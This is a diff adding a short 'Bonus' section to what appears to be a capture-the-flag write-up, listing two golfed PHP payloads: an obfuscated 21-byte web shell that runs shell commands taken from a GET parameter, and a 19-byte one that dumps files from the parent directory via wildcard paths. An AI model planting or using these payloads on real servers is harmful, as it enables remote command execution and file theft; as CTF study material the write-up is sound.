@@ -134,4 +134,22 @@ Even more tricky here using only 33 characters... It calls for shell via `` `...
 
 
 
+## Bonus
+After the competition me and @Kittehs golfed a little and managed to get much shorter payloads!
+
+- 21 bytes (full shell via `?_=rgrep /var/www MeePwn`)
+```php
+<?=`{${~"\xa0\xb8\xba\xab"}[_]}`;
+```
+- 19 bytes (`cat` all files from `../`)
+```php
+<?=`/???/??? ../*`;
+```
+
+
+
+
+
+
+
 [index.php]:<./index.php>
